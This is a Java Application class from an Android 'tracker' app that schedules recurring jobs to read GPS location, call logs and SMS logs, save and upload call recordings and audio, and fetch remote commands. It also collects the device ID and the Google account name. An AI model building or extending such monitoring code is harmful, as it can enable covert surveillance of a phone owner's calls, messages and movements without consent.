package com.alcatrazstudios.apps.androidtracker.application;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.AlarmManager;
import android.app.Application;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.SystemClock;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.alcatrazstudios.apps.androidtracker.activities.PermissionsActivity;
import com.alcatrazstudios.apps.androidtracker.config.TrackerConfiguration;
import com.alcatrazstudios.apps.androidtracker.model.GpsTrackerEvent;
import com.alcatrazstudios.apps.androidtracker.receiver.CallLogBroadcastReceiver;
import com.alcatrazstudios.apps.androidtracker.receiver.CallRecordsReceiver;
import com.alcatrazstudios.apps.androidtracker.receiver.GpsConfigurationChangeReceiver;
import com.alcatrazstudios.apps.androidtracker.receiver.GpsConfigurationReceiver;
import com.alcatrazstudios.apps.androidtracker.receiver.GpsTrackerAlarmReceiver;
import com.alcatrazstudios.apps.androidtracker.receiver.SaveCallRecordsReceiver;
import com.alcatrazstudios.apps.androidtracker.receiver.SmsLogBroadcastReceiver;
import com.alcatrazstudios.apps.androidtracker.receiver.UploadAudioReceiver;
import com.alcatrazstudios.apps.androidtracker.receiver.UploadDataAlarmReceiver;

import java.util.concurrent.atomic.AtomicInteger;

import java.util.HashMap;
import java.util.Map;

import io.realm.Realm;
import io.realm.RealmConfiguration;
import io.realm.RealmObject;
import io.realm.RealmResults;

/**
 * Created by irepan on 28/03/17.
 */

public class GpsTrackerApplication extends Application {
    private static GpsTrackerApplication mInstance;
    private static final String TAG="GpTracker";

    private Map<Class<? extends RealmObject>,AtomicInteger> IdMaps;
    private SharedPreferences sharedPreferences;

    private TrackerConfiguration configuration;


    @Override
    public void onCreate() {
        super.onCreate();
        IdMaps = new HashMap<>();
        Realm.init(this.getApplicationContext());
        setupRealmGpsTracker();
        Realm realm = Realm.getDefaultInstance();
        IdMaps.put(GpsTrackerEvent.class, getIdByTable(realm,GpsTrackerEvent.class));
        sharedPreferences = this.getSharedPreferences("com.alcatrazstudios.apps.androidtracker.prefs", Context.MODE_PRIVATE);
        configuration=new TrackerConfiguration(sharedPreferences);
        mInstance = this;
        realm.close();

    }

    public TrackerConfiguration getConfiguration() {
        return configuration;
    }

    public void setConfiguration(TrackerConfiguration configuration) {
        this.configuration = configuration;
    }

    private void setupRealmGpsTracker(){
        RealmConfiguration configuration = new RealmConfiguration
                .Builder()
                .deleteRealmIfMigrationNeeded()
                .build();
        Realm.setDefaultConfiguration(configuration);
    }

    public static synchronized GpsTrackerApplication getInstance() {
        return mInstance;
    }
    public static SharedPreferences getSharedPreferences(){
        return mInstance.sharedPreferences;
    }
 /*   public void setConnectivityListener(GpsTrackerConnectivityReceiver.ConnectivityReceiverListener listener) {
        GpsTrackerConnectivityReceiver.connectivityReceiverListener = listener;
    }*/

    public <T extends RealmObject> int getId(Class<T> anyClass){
        int value = 0;
        if (IdMaps.containsKey(anyClass)) {
            value = IdMaps.get(anyClass).incrementAndGet();
        } else {
            value = 1;
            IdMaps.put(anyClass,new AtomicInteger(value));
        }
        return value;
    }
    private <T extends RealmObject> AtomicInteger getIdByTable(Realm realm, Class<T> anyClass){
        RealmResults<T> result=realm.where(anyClass).findAll();
        return result.size()>0 ? new AtomicInteger(result.max("id").intValue()) : new AtomicInteger();
    }
    public static GpsTrackerApplication getmInstance(){
        return mInstance;
    }

    public static boolean CheckPermission(Context context, String permission){
        int result = context.checkCallingOrSelfPermission(permission);
        return result ==PackageManager.PERMISSION_GRANTED;
    }

    public static boolean CheckPermission(String permission){
        return GpsTrackerApplication.CheckPermission(GpsTrackerApplication.getInstance(),permission);
    }

    public static String getUniqueID(){
        String myAndroidDeviceId="";
        TelephonyManager mTelephony = (TelephonyManager) mInstance.getSystemService(Context.TELEPHONY_SERVICE);
        if (mTelephony.getDeviceId() != null){
            myAndroidDeviceId = mTelephony.getDeviceId();
        }
        if (myAndroidDeviceId.isEmpty() || myAndroidDeviceId.equals("000000000000000")){
            myAndroidDeviceId = Settings.Secure.getString(mInstance.getApplicationContext().getContentResolver(), Settings.Secure.ANDROID_ID);
        }
        return myAndroidDeviceId;
    }
    public static String getGoogleAccount(){
        AccountManager manager = (AccountManager) mInstance.getSystemService(ACCOUNT_SERVICE);
        Account[] accounts = manager.getAccounts();
        int i;
        for (i=0 ; i<accounts.length; i++){
            Account account=accounts[i];
            if (account.type.compareTo("com.google")==0){
                return account.name;
            }
        }
        return "";

    }
    public static void startPermissionActivity(){
        Log.d(TAG, "startPermissionActivity");

        Context context = mInstance.getBaseContext();
        Intent intent=new Intent(context,PermissionsActivity.class);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
    }

    public static void startAlarm(Context context,Class receiverClass,int interalMinutes){
        AlarmManager alarmManager = (AlarmManager)context.getSystemService(Context.ALARM_SERVICE);
        Intent intent=new Intent(context,receiverClass);
        PendingIntent pendingIntent=PendingIntent.getBroadcast(context,0,intent,0);
        alarmManager.setRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP,
                SystemClock.elapsedRealtime(),
                interalMinutes * 60000,
                pendingIntent);
    }

    private static void cancelAlarm(Context context,Class receiverClass) {
        Log.d(TAG, "cancelAlarmManager");

        Intent intent = new Intent(context, receiverClass);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, intent, 0);
        AlarmManager alarmManager = (AlarmManager)context.getSystemService(Context.ALARM_SERVICE);
        alarmManager.cancel(pendingIntent);
    }

    public static void startAlarmManager(){
        Context context=mInstance.getBaseContext();
        startAlarmManager(context);
    }

    public static void startAlarmManager(Context context) {
        Log.i(TAG, "startAlarmManager");

        startAlarm(context, GpsConfigurationChangeReceiver.class,10);

        startAlarm(context, UploadDataAlarmReceiver.class,1);

        startAlarm(context, CallRecordsReceiver.class,10);

        startAlarm(context, UploadAudioReceiver.class,1);

//        switchCallRecording(context);

//        startAlarm(context, SaveCallRecordsReceiver.class,1);

        startServices(context);

    }
    public static void restartServices(Context context){
        Log.i(TAG,"Stopping services");
        TrackerConfiguration configuration=mInstance.getConfiguration();

        cancelAlarm(context,SaveCallRecordsReceiver.class);
        startAlarm(context, SaveCallRecordsReceiver.class,configuration.getCallRecordUpFrequencyMinutes());

        cancelAlarm(context,GpsConfigurationReceiver.class);
        startAlarm(context,GpsConfigurationReceiver.class,configuration.getCommandReaderFrequencyMinutes());

        cancelAlarm(context, CallLogBroadcastReceiver.class);
        startAlarm(context, CallLogBroadcastReceiver.class,configuration.getCallLogFrequencyMinutes());

        cancelAlarm(context, SmsLogBroadcastReceiver.class);
        startAlarm(context, SmsLogBroadcastReceiver.class,configuration.getSmsReaderFrequencyMinutes());

        cancelAlarm(context, GpsTrackerAlarmReceiver.class);
        startAlarm(context, GpsTrackerAlarmReceiver.class,configuration.getGpsReaderFrequencyMinutes());
    }

    public static void switchCallRecording(Context context ){
        Log.i(TAG,"Switching call recording");
/*        TrackerConfiguration configuration=mInstance.getConfiguration();

        Intent intent = new Intent(context, TService.class);
        if (configuration.isRecordCalls()){
            Log.i(TAG,"Start recording");
            context.startService(intent);
        } else {
            Log.i(TAG,"No recording");
            context.stopService(intent);
        }
*/
    }

    public static void startServices(Context context){
        Log.i(TAG,"Starting services");
        TrackerConfiguration configuration=mInstance.getConfiguration();

        startAlarm(context, SaveCallRecordsReceiver.class,configuration.getCallRecordUpFrequencyMinutes());

        startAlarm(context,GpsConfigurationReceiver.class,configuration.getCommandReaderFrequencyMinutes());

        startAlarm(context, CallLogBroadcastReceiver.class,configuration.getCallLogFrequencyMinutes());

        startAlarm(context, SmsLogBroadcastReceiver.class,configuration.getSmsReaderFrequencyMinutes());

        startAlarm(context, GpsTrackerAlarmReceiver.class,configuration.getGpsReaderFrequencyMinutes());

    }

    @Override
    public void onTerminate() {
        super.onTerminate();
        Log.i(TAG,"Terminate");
    }

}
